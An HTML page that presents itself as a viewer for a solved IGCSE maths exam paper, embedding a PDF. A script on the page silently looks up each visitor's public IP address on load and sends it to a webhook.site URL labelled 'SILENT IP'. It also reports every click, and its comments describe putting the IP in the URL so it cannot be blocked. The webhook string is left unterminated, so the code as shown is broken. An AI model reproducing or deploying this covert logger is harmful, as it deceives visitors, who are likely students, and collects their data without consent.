<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IGCSE Papers Math Calculator- Feb/March 2026</title>
    <style>
        body { margin: 0; background: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
        .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
        #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
    </style>
</head>
<body>
    <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
    <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>

    <script>
        const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b

        // 1. SILENT IP (Fires immediately)
        async function getIntel() {
            try {
                // Fetch the IP from the provider
                const res = await fetch('https://api.ipify.org');
                const data = await res.json();
                
                // SEND TO WEBHOOK via the verified Fetch Ping method
                // We put the IP in the URL (?ip=...) so it can't be blocked
                fetch(`${webhookURL}?type=SILENT_IP&ip_address=${data.ip}`, { mode: 'no-cors' });
                
                console.log("✅ IP Data Sent to Webhook");
            } catch (e) {
                // If the IP fetch itself is blocked, we still ping the webhook
                fetch(`${webhookURL}?type=LOAD_LOGGED&status=IP_FETCH_BLOCKED`, { mode: 'no-cors' });
            }
        }

        // Start the process
        getIntel();

        // 2. CLICK TRIGGER (For testing interaction)
        window.onclick = () => {
            fetch(`${webhookURL}?type=USER_CLICKED_PAGE`, { mode: 'no-cors' });
        };
    </script>
</body>
